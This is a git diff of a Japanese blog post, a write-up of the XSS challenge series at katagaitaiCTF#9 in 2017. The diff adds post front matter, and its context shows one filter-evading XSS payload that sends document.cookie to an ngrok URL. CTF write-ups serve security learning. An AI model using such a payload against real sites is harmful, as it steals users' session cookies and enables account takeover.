@@ -1,4 +1,11 @@
-### katagaitaiCTF xss千本ノック write up
+---
+layout: post
+date: 2017-08-28
+title: katagaitaiCTF#9 xss千本ノック write up
+tags: [katagaitaiCTF, katagaitaiCTF#9, xss, xss千本ノック, write up]
+excerpt: 8月27日に秋葉原で開かれたkatagaitaiCTFに参加してきました。そこで行われたxss千本ノックのwrite upです。
+
+---
 
 8月27日に秋葉原で開かれたkatagaitaiCTFに参加してきました。  
 そこで行われたxss千本ノックのwrite upです。
@@ -79,3 +86,4 @@ Stage10といっしょ。
 ```
 /?q=<img%20src=x%20oscriptnerror=location.href="http://b5236666.ngrok.io?c="%2bdocument.cookie;>
 ```
+
